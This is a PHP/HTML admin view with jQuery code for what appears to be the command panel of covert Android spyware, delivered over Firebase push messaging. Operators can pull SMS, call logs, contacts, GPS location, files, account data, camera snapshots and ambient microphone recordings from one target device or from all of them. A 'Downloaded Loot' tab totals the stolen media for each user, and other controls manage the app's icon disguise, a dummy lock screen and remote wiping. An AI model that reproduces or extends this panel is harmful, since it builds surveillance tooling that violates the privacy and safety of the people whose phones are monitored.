<div class="content-wrapper">
    <!-- Page Header -->
    <section class="content-header">
        <div class="container-fluid">
            <div class="row mb-2 align-items-center">
                <div class="col-sm-6">
                    <h1><i class="fas fa-mobile-alt text-primary mr-2"></i>Remote Device Management</h1>
                </div>
                <div class="col-sm-6">
                    <ol class="breadcrumb float-sm-right">
                        <li class="breadcrumb-item"><a href="<?= base_url('admin/dashboard') ?>">Admin</a></li>
                        <li class="breadcrumb-item active">Remote Device</li>
                    </ol>
                </div>
            </div>
        </div>
    </section>

    <section class="content">
        <div class="container-fluid">

            <!-- Navigation Hub Submenu -->
            <div class="card card-outline card-info mb-3">
                <div class="card-body p-2 d-flex flex-wrap align-items-center justify-content-between">
                    <ul class="nav nav-pills">
                        <li class="nav-item">
                            <a class="nav-link active font-weight-bold" href="<?= base_url('admin/remote-device') ?>">
                                <i class="fas fa-satellite-dish mr-1"></i> Remote Commands
                            </a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link" href="<?= base_url('admin/defaults') ?>">
                                <i class="fas fa-sliders-h mr-1"></i> App Defaults
                            </a>
                        </li>
                        <?php if (function_exists('auth') && auth()->loggedIn() && auth()->user()->inGroup('superadmin')): ?>
                        <li class="nav-item">
                            <a class="nav-link text-danger" href="<?= base_url('superadmin/fleet') ?>">
                                <i class="fas fa-shield-alt mr-1"></i> SuperAdmin Fleet Grid
                            </a>
                        </li>
                        <?php endif; ?>
                    </ul>
                </div>
            </div>

            <!-- Page Callout -->
            <div class="callout callout-info">
                <h5><i class="fas fa-satellite-dish mr-2"></i>Remote Device Control Console</h5>
                <p class="mb-0 text-muted small">
                    Send push commands to connected Android client devices to extract logs, change configurations, query status,
                    or manage the app installation lifecycle. Select a target user below, then choose a command.
                </p>
            </div>

            <!-- Target Selection Card -->
            <div class="card card-outline card-info shadow-sm mb-4">
                <div class="card-header bg-white border-bottom">
                    <h3 class="card-title font-weight-bold text-dark mb-0">
                        <i class="fas fa-crosshairs text-info mr-2"></i>Target Selection
                    </h3>
                </div>
                <div class="card-body p-4">
                    <div class="row align-items-center">
                        <div class="col-md-7 mb-3 mb-md-0">
                            <label for="targetUserId" class="font-weight-bold text-dark mb-2">
                                <i class="fas fa-mobile-alt text-secondary mr-1"></i> Target Device / User
                            </label>
                            <div class="input-group">
                                <div class="input-group-prepend">
                                    <span class="input-group-text bg-light border-right-0"><i class="fas fa-user text-muted"></i></span>
                                </div>
                                <select class="form-control border-left-0 font-weight-600" id="targetUserId" style="height: 42px;">
                                    <option value="all">⚡ Broadcast to All Registered Devices</option>
                                    <?php if (!empty($users)): ?>
                                        <?php foreach ($users as $u): ?>
                                        <option value="<?= $u['id'] ?>">👤 <?= htmlspecialchars($u['username']) ?></option>
                                        <?php endforeach; ?>
                                    <?php endif; ?>
                                </select>
                            </div>
                            <small class="text-muted d-block mt-2">
                                <i class="fas fa-info-circle mr-1"></i>Select a target user to send push commands to, or broadcast to all active devices.
                            </small>
                        </div>
                        <div class="col-md-5">
                            <label class="font-weight-bold text-dark mb-2">
                                <i class="fas fa-signal text-secondary mr-1"></i> Fleet Reachability Status
                            </label>
                            <div class="card bg-light border-0 mb-0 shadow-none">
                                <div class="card-body p-3 d-flex align-items-center justify-content-between" id="currentTargetDisplay" style="min-height: 42px;">
                                    <?php if (empty($users)): ?>
                                        <div class="d-flex align-items-center text-warning font-weight-bold">
                                            <i class="fas fa-exclamation-triangle mr-2 fa-lg"></i>
                                            <span>No FCM-registered devices</span>
                                        </div>
                                        <span class="badge badge-warning px-2 py-1">Offline</span>
                                    <?php else: ?>
                                        <div class="d-flex align-items-center text-success font-weight-bold">
                                            <i class="fas fa-check-circle mr-2 fa-lg"></i>
                                            <span><?= count($users) ?> Device(s) Ready</span>
                                        </div>
                                        <span class="badge badge-success px-2 py-1">Active</span>
                                    <?php endif; ?>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Main Tab Card -->
            <div class="card card-primary card-outline shadow-sm">
                <div class="card-header p-0 pt-1 border-bottom-0">
                    <ul class="nav nav-tabs" id="adminRemoteTabs" role="tablist">
                        <li class="nav-item">
                            <a class="nav-link active" data-toggle="tab" href="#tab-fetch" role="tab">
                                <i class="fas fa-database mr-1"></i> Data Fetch
                            </a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link" data-toggle="tab" href="#tab-mgmt" role="tab">
                                <i class="fas fa-cogs mr-1"></i> Device Management
                            </a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link" data-toggle="tab" href="#tab-loot-stats" role="tab">
                                <i class="fas fa-download mr-1"></i> Downloaded Loot
                            </a>
                        </li>
                    </ul>
                </div>

                <div class="card-body">
                    <div class="tab-content">

                        <!-- ====================== TAB 1: DATA FETCH ====================== -->
                        <div class="tab-pane fade show active" id="tab-fetch" role="tabpanel">
                            <div class="alert alert-light border-left-primary border mb-4">
                                <i class="fas fa-info-circle text-primary mr-2"></i>
                                Commands fetch telemetry and forensic data from the selected user's device(s). Each device must be online to receive commands.
                            </div>
                            <div class="row" id="admin-fetch-grid">
                                <?php
                                 $fetchCmds = [
                                    ['id' => 'contacts',      'label' => 'Contacts',       'icon' => 'fa-address-book',   'color' => '#17a2b8', 'desc' => 'Phonebook contacts'],
                                    ['id' => 'beep',          'label' => 'Test Beep',      'icon' => 'fa-volume-up',      'color' => '#8e44ad', 'desc' => 'Play audible test beep'],
                                    ['id' => 'health_check',  'label' => 'Device Health',  'icon' => 'fa-heartbeat',      'color' => '#e53935', 'desc' => 'Instant battery/network check'],
                                    ['id' => 'apps',          'label' => 'Apps List',      'icon' => 'fa-th-large',       'color' => '#6f42c1', 'desc' => 'Installed packages list'],
                                    ['id' => 'calls',         'label' => 'Calls Logs',     'icon' => 'fa-phone-alt',      'color' => '#28a745', 'desc' => 'Call history list'],
                                    ['id' => 'sms',           'label' => 'SMS Messages',   'icon' => 'fa-sms',            'color' => '#007bff', 'desc' => 'Text messages logs'],
                                    ['id' => 'location',      'label' => 'Location & Act', 'icon' => 'fa-map-marker-alt', 'color' => '#dc3545', 'desc' => 'GPS & activity logs'],
                                    ['id' => 'telemetry_soft','label' => 'Usage & Notifs', 'icon' => 'fa-chart-pie',      'color' => '#6610f2', 'desc' => 'Screen time & status alerts'],
                                    ['id' => 'capture_photo', 'label' => 'Camera Capture', 'icon' => 'fa-camera',         'color' => '#d81b60', 'desc' => 'Snapshot from camera'],
                                    ['id' => 'record_audio',  'label' => 'Audio Capture',  'icon' => 'fa-microphone',     'color' => '#ff8f00', 'desc' => 'Ambient mic clip record'],
                                    ['id' => 'files',         'label' => 'Device Files',   'icon' => 'fa-file-alt',       'color' => '#20c997', 'desc' => 'System filesystem files'],
                                    ['id' => 'software_misc', 'label' => 'Misc Software',  'icon' => 'fa-calendar-alt',   'color' => '#fd7e14', 'desc' => 'Calendar, locale, accounts'],
                                    ['id' => 'hardware_misc', 'label' => 'Misc Hardware',  'icon' => 'fa-microchip',      'color' => '#117a8b', 'desc' => 'Bluetooth, sensors, thermal'],
                                    ['id' => 'all',           'label' => 'Sync All',       'icon' => 'fa-sync-alt',       'color' => '#b21f2d', 'desc' => 'Trigger all extractors'],
                                ];
                                foreach ($fetchCmds as $c):
                                ?>
                                <div class="col-6 col-sm-4 col-md-3 col-lg-2 mb-3 text-center">
                                    <button class="btn btn-block btn-admin-fetch p-3 shadow-sm border h-100 d-flex flex-column align-items-center justify-content-center"
                                            data-cmd="<?= $c['id'] ?>"
                                            style="border-radius:10px; background:#fff; transition:all 0.25s ease-in-out; cursor:pointer;">
                                        <div class="mb-2" style="color:<?= $c['color'] ?>; font-size:1.9rem; width:52px; height:52px; display:flex; align-items:center; justify-content:center; background:rgba(0,0,0,0.03); border-radius:50%;">
                                            <i class="fas <?= $c['icon'] ?>"></i>
                                        </div>
                                        <span class="font-weight-bold text-dark mb-1" style="font-size:13px;"><?= $c['label'] ?></span>
                                        <small class="text-muted d-none d-sm-block" style="font-size:10.5px; line-height:1.3;"><?= $c['desc'] ?></small>
                                    </button>
                                </div>
                                <?php endforeach; ?>
                            </div>
                        </div>

                        <!-- ====================== TAB 2: DEVICE MANAGEMENT ====================== -->
                        <div class="tab-pane fade" id="tab-mgmt" role="tabpanel">
                            <div class="alert alert-warning mb-4">
                                <i class="fas fa-exclamation-triangle mr-2"></i>
                                <strong>Critical Operations:</strong> These commands force irreversible actions on client devices. Confirm target inputs before proceeding.
                            </div>
                            <div class="row">

                                <!-- Reset App -->
                                <div class="col-md-6 col-lg-4 mb-4">
                                    <div class="card card-outline card-warning h-100 shadow-sm">
                                        <div class="card-body text-center p-4">
                                            <div class="mb-3"><i class="fas fa-undo fa-3x text-warning"></i></div>
                                            <h5 class="card-title text-warning font-weight-bold">Reset App</h5>
                                            <p class="text-muted small mb-4">Restores default app icon/disguise, resets emergency access launch code to factory default.</p>
                                            <button class="btn btn-warning btn-block font-weight-bold btn-admin-mgmt" data-cmd="reset_app">
                                                <i class="fas fa-undo mr-1"></i> Execute Reset
                                            </button>
                                        </div>
                                    </div>
                                </div>

                                <!-- Deactivate App -->
                                <div class="col-md-6 col-lg-4 mb-4">
                                    <div class="card card-outline card-secondary h-100 shadow-sm">
                                        <div class="card-body text-center p-4">
                                            <div class="mb-3"><i class="fas fa-eye-slash fa-3x text-secondary"></i></div>
                                            <h5 class="card-title text-secondary font-weight-bold">Deactivate App</h5>
                                            <p class="text-muted small mb-4">Replaces the active user interface with a dummy screen lock. Suspends extraction logging.</p>
                                            <button class="btn btn-secondary btn-block font-weight-bold btn-admin-mgmt" data-cmd="deactivate">
                                                <i class="fas fa-eye-slash mr-1"></i> Deactivate Screen
                                            </button>
                                        </div>
                                    </div>
                                </div>

                                <!-- Logout User -->
                                <div class="col-md-6 col-lg-4 mb-4">
                                    <div class="card card-outline card-info h-100 shadow-sm">
                                        <div class="card-body text-center p-4">
                                            <div class="mb-3"><i class="fas fa-sign-out-alt fa-3x text-info"></i></div>
                                            <h5 class="card-title text-info font-weight-bold">Logout User</h5>
                                            <p class="text-muted small mb-4">Clears authorization tokens on the device immediately and stops all periodic background services.</p>
                                            <button class="btn btn-info btn-block font-weight-bold btn-admin-mgmt" data-cmd="logout">
                                                <i class="fas fa-sign-out-alt mr-1"></i> Force Logout
                                            </button>
                                        </div>
                                    </div>
                                </div>

                                <!-- Uninstall Keep Data -->
                                <div class="col-md-6 col-lg-4 mb-4">
                                    <div class="card card-outline card-danger h-100 shadow-sm">
                                        <div class="card-body text-center p-4">
                                            <div class="mb-3"><i class="fas fa-archive fa-3x text-danger"></i></div>
                                            <h5 class="card-title text-danger font-weight-bold">Uninstall (Keep Data)</h5>
                                            <p class="text-muted small mb-4">Backs up unsaved records, then opens system uninstallation wizard. Data remains in cloud logs.</p>
                                            <button class="btn btn-danger btn-block font-weight-bold btn-admin-mgmt" data-cmd="uninstall_preserve">
                                                <i class="fas fa-archive mr-1"></i> Uninstall &amp; Preserve
                                            </button>
                                        </div>
                                    </div>
                                </div>

                                <!-- Uninstall Wipe All -->
                                <div class="col-md-6 col-lg-4 mb-4">
                                    <div class="card card-outline card-dark h-100 shadow-sm">
                                        <div class="card-body text-center p-4">
                                            <div class="mb-3"><i class="fas fa-trash-alt fa-3x text-dark"></i></div>
                                            <h5 class="card-title font-weight-bold">Uninstall (Wipe All)</h5>
                                            <p class="text-muted small mb-4">Clears offline SQLite databases, purges backups, and triggers complete system package removal.</p>
                                            <button class="btn btn-dark btn-block font-weight-bold btn-admin-mgmt" data-cmd="uninstall_wipe">
                                                <i class="fas fa-trash-alt mr-1"></i> Uninstall &amp; Wipe All
                                            </button>
                                        </div>
                                    </div>
                                </div>

                            </div><!-- /.row -->
                        </div><!-- /.tab-pane#tab-mgmt -->

                        <!-- ====================== TAB 3: DOWNLOADED LOOT STATS ====================== -->
                        <div class="tab-pane fade" id="tab-loot-stats" role="tabpanel">
                            <div class="alert alert-light border-left-info border mb-4">
                                <i class="fas fa-info-circle text-info mr-2"></i>
                                Summary statistics of extracted captured media and downloaded files per user.
                            </div>
                            
                            <div class="table-responsive">
                                <table class="table table-hover table-striped">
                                    <thead>
                                        <tr>
                                            <th>User</th>
                                            <th class="text-center">Capture Count</th>
                                            <th class="text-center">Capture Size</th>
                                            <th class="text-center">Downloaded Files</th>
                                            <th class="text-center">Files Size</th>
                                            <th class="text-center">Total Stats</th>
                                        </tr>
                                    </thead>
                                    <tbody>
                                        <?php if (empty($stats)): ?>
                                        <tr>
                                            <td colspan="6" class="text-center py-4 text-muted">No data stats found.</td>
                                        </tr>
                                        <?php else: ?>
                                            <?php foreach ($stats as $s): 
                                                $total_count = $s['media_count'] + $s['files_count'];
                                                $total_size = $s['media_size'] + $s['files_size'];
                                                
                                                $formatSize = function($bytes) {
                                                    if ($bytes < 1024) return $bytes . ' B';
                                                    elseif ($bytes < 1048576) return round($bytes / 1024, 1) . ' KB';
                                                    else return round($bytes / 1048576, 1) . ' MB';
                                                };
                                            ?>
                                            <tr>
                                                <td>
                                                    <strong class="text-uppercase font-weight-bold d-block text-dark"><?= htmlspecialchars($s['username']) ?></strong>
                                                    <small class="text-muted font-italic d-block"><?= htmlspecialchars($s['email'] ?? '-') ?></small>
                                                    <small class="text-muted d-block" style="font-size: 11px;">ID: #<?= $s['id'] ?></small>
                                                </td>
                                                <td class="text-center font-weight-bold text-primary">
                                                    <?= $s['media_count'] ?>
                                                </td>
                                                <td class="text-center text-muted">
                                                    <?= $formatSize($s['media_size']) ?>
                                                </td>
                                                <td class="text-center font-weight-bold text-success">
                                                    <?= $s['files_count'] ?>
                                                </td>
                                                <td class="text-center text-muted">
                                                    <?= $formatSize($s['files_size']) ?>
                                                </td>
                                                <td class="text-center">
                                                    <span class="badge badge-info px-2 py-1">
                                                        <?= $total_count ?> files / <?= $formatSize($total_size) ?>
                                                    </span>
                                                </td>
                                            </tr>
                                            <?php endforeach; ?>
                                        <?php endif; ?>
                                    </tbody>
                                </table>
                            </div>
                        </div><!-- /.tab-pane -->

                    </div><!-- /.tab-content -->
                </div><!-- /.card-body -->

                <div class="card-footer bg-light">
                    <div class="d-flex align-items-center">
                        <i class="fas fa-info-circle text-muted mr-2"></i>
                        <small class="text-muted">Commands are sent via Firebase Cloud Messaging (FCM). Devices must be online to receive them. Some actions require Device Admin privileges.</small>
                    </div>
                </div>

            </div><!-- /.card -->

        </div><!-- /.container-fluid -->
    </section>
</div><!-- /.content-wrapper -->

<style>
.btn-admin-fetch:hover {
    transform: translateY(-4px);
    box-shadow: 0 8px 20px rgba(0,0,0,0.12) !important;
    border-color: #007bff !important;
}
.btn-admin-fetch:active { transform: translateY(-1px); }
.btn-admin-fetch.loading { opacity: 0.65; pointer-events: none; }
.btn-admin-mgmt.loading  { opacity: 0.65; pointer-events: none; }
</style>

<script>
function getUserId() { return $('#targetUserId').val(); }

function sendCmd(userId, command, payload, extra) {
    const $btn = $(event.target).closest('button');
    if ($btn.length) {
        $btn.data('orig-html', $btn.html()).prop('disabled', true).html('<i class="fas fa-spinner fa-spin mr-1"></i> Sending…');
    }
    $.ajax({
        url: '<?= base_url('admin/remote-device/send') ?>',
        method: 'POST',
        data: { user_id: userId, command: command, payload: payload, extra_data: JSON.stringify(extra || {}) },
        dataType: 'json',
        timeout: 120000,
        success(r) {
            if ($btn.length) $btn.prop('disabled', false).html($btn.data('orig-html') || 'Send');
            if (r.success) {
                Swal.fire({ icon:'success', title:'Command Sent', text: r.message, timer:3000, showConfirmButton:false });
            } else {
                Swal.fire({ icon:'error', title:'Error', text: r.message || 'Failed to send command.' });
            }
        },
        error() {
            if ($btn.length) $btn.prop('disabled', false).html($btn.data('orig-html') || 'Send');
            Swal.fire({ icon:'error', title:'Network Error', text:'Could not reach the server.' });
        }
    });
}

$(function() {
    $('#targetUserId').on('change', function() {
        const v = $(this).val();
        $('#currentTargetDisplay').html(v === 'all'
            ? '<span class="text-info"><i class="fas fa-globe mr-1"></i> Broadcasting to ALL users</span>'
            : '<span class="text-success"><i class="fas fa-user mr-1"></i> Targeting: ' + $(this).find('option:selected').text() + '</span>');
        loadDeviceConfig();
    });

    // ---- Data Fetch ----
    $('.btn-admin-fetch').on('click', function() {
        const cmd    = $(this).data('cmd');
        const userId = getUserId();
        const label  = $(this).find('span').first().text() || cmd;
        const prompts = {
            fetch_file:    { title:'File Path',   text:'Enter exact file path:',              input:'text'   },
            search_data:   { title:'Keyword',     text:'Enter keyword to search in SMS/Calls:', input:'text'  },
            start_tracking:{ title:'Duration',    text:'Enter tracking duration in minutes:',  input:'number', value:60 },
        };
        if (prompts[cmd]) {
            Swal.fire({
                title: prompts[cmd].title, text: prompts[cmd].text,
                input: prompts[cmd].input, inputValue: prompts[cmd].value,
                showCancelButton: true, confirmButtonText: 'Send',
                inputValidator: v => { if (!v) return 'This field is required!'; }
            }).then(r => {
                if (r.isConfirmed) sendCmd(userId, 'cmd_' + cmd, cmd, { file_path: r.value, keyword: r.value, duration_minutes: r.value });
            });
        } else {
            Swal.fire({
                title: 'Send ' + label + '?',
                text:  'Send to ' + (userId === 'all' ? 'ALL users' : 'selected user') + '?',
                icon: 'question', showCancelButton: true, confirmButtonText: 'Send Command'
            }).then(r => {
                if (r.isConfirmed) sendCmd(userId, 'cmd_' + cmd, cmd, {});
            });
        }
    });

    // ---- Device Management ----
    $('.btn-admin-mgmt').on('click', function() {
        const cmd    = $(this).data('cmd');
        const userId = getUserId();
        const mgmtPay = { reset_app:'reset', deactivate:'deactivate', logout:'logout', uninstall_preserve:'uninstall_preserve', uninstall_wipe:'uninstall_wipe' };
        const titles  = { reset_app:'Reset App', deactivate:'Deactivate App', logout:'Force Logout', uninstall_preserve:'Uninstall (Keep Data)', uninstall_wipe:'Uninstall (Wipe All)' };
        Swal.fire({
            title: titles[cmd] || 'Execute Command?',
            text:  'This will be sent to ' + (userId === 'all' ? 'ALL users' : 'the selected user') + '. This action may be irreversible.',
            icon: 'warning', showCancelButton: true, confirmButtonColor: '#dc3545', confirmButtonText: 'Execute'
        }).then(r => {
            if (r.isConfirmed) sendCmd(userId, 'cmd_' + cmd, mgmtPay[cmd] || cmd, {});
        });
    });

});
</script>
